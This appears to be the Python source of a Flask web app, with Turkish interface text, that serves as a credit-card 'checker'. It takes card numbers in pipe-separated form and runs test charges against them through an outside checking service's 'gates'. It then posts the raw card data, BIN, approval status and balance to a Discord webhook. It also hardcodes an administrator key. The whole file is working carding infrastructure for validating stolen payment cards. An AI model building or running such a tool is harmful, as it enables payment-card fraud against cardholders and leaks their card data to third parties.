from flask import Flask, render_template, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "templates")

CHK_API_KEY = os.environ.get("CHK_API_KEY")
API_BASE = os.environ.get("CHK_API_BASE", "http://api.chk.wtf/api")
WEBHOOK_URL = os.environ.get("CHK_WEBHOOK_URL")

ADMIN_KEY = "parox522"
USER_KEY = os.environ.get("USER_KEY", "ck-51ffc830c2dd")

GATE_NAMES = {1: "Global", 2: "Ccn", 3: "Auth"}

def send_discord_webhook(card_input, result, user_label="user"):
    if not WEBHOOK_URL:
        return
    status = result.get("status", "unknown")
    message = result.get("message", "")
    card_raw = result.get("card", card_input)
    gate_id = result.get("gate", "?")
    resp_time = result.get("time", "N/A")
    balance = result.get("balance", "N/A")
    bin_val = result.get("bin", "N/A")
    gate_name = GATE_NAMES.get(gate_id, f"Gate {gate_id}")

    emoji = "✅" if status == "approved" else "❌" if status == "declined" else "⚠️"
    title = f"{emoji} Kart {'Onaylandı' if status == 'approved' else 'Reddedildi' if status == 'declined' else 'Hatası'}"

    fields = [
        {"name": "📋 Durum", "value": f"`{message}`", "inline": True},
        {"name": "⏱ Süre", "value": f"`{resp_time}`", "inline": True},
        {"name": "🔢 BIN", "value": f"`{bin_val}`", "inline": True},
        {"name": "🚪 Gate", "value": f"`{gate_name}`", "inline": True},
        {"name": "💎 Bakiye", "value": f"`{balance}`", "inline": True},
    ]

    embed = {
        "title": title,
        "description": f"```{card_raw.replace('`','')}```",
        "color": 0x57f287 if status == "approved" else 0xed4245 if status == "declined" else 0xfee75c,
        "fields": fields,
        "footer": {"text": f"👤 {user_label}"},
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    try:
        requests.post(WEBHOOK_URL, json={"username": "Checker", "embeds": [embed]}, timeout=10)
    except:
        pass

def check_auth():
    key = request.headers.get("X-Api-Key") or request.args.get("key")
    if key == ADMIN_KEY:
        return "admin"
    if key == USER_KEY:
        return "user"
    return None

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/login", methods=["POST"])
def login():
    data = request.get_json()
    key = data.get("key", "").strip()
    if key == ADMIN_KEY:
        return jsonify({"status": "success", "role": "admin", "label": "Admin"})
    if key == USER_KEY:
        return jsonify({"status": "success", "role": "user", "label": "Kullanıcı"})
    return jsonify({"status": "error", "message": "Geçersiz anahtar"})

@app.route("/api/me", methods=["GET"])
def me():
    role = check_auth()
    if not role:
        return jsonify({"status": "error", "message": "Geçersiz anahtar"})
    return jsonify({"status": "success", "role": role, "label": "Admin" if role == "admin" else "Kullanıcı"})

@app.route("/api/check", methods=["POST"])
def check_card():
    role = check_auth()
    if not role:
        return jsonify({"status": "error", "message": "Geçersiz anahtar"})

    data = request.get_json()
    card = data.get("card", "")
    gate = data.get("gate")

    if not card or "|" not in card:
        return jsonify({"status": "error", "message": "Geçersiz kart formatı"})

    headers = {"Content-Type": "application/json", "chkwtf-api-key": CHK_API_KEY}
    payload = {"card": card}
    if gate:
        payload["gate"] = gate

    try:
        resp = requests.post(f"{API_BASE}/charge", headers=headers, json=payload, timeout=55)
        result = resp.json()
        send_discord_webhook(card, result, "Admin" if role == "admin" else "Kullanıcı")
        return jsonify(result)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/api/balance", methods=["GET"])
def get_balance():
    if not check_auth():
        return jsonify({"status": "error", "message": "Geçersiz anahtar"})
    headers = {"Content-Type": "application/json", "chkwtf-api-key": CHK_API_KEY}
    try:
        resp = requests.post(f"{API_BASE}/balance", headers=headers, timeout=10)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/api/gates", methods=["GET"])
def get_gates():
    if not check_auth():
        return jsonify({"status": "error", "message": "Geçersiz anahtar"})
    headers = {"Content-Type": "application/json", "chkwtf-api-key": CHK_API_KEY}
    try:
        resp = requests.post(f"{API_BASE}/gates", headers=headers, timeout=10)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})
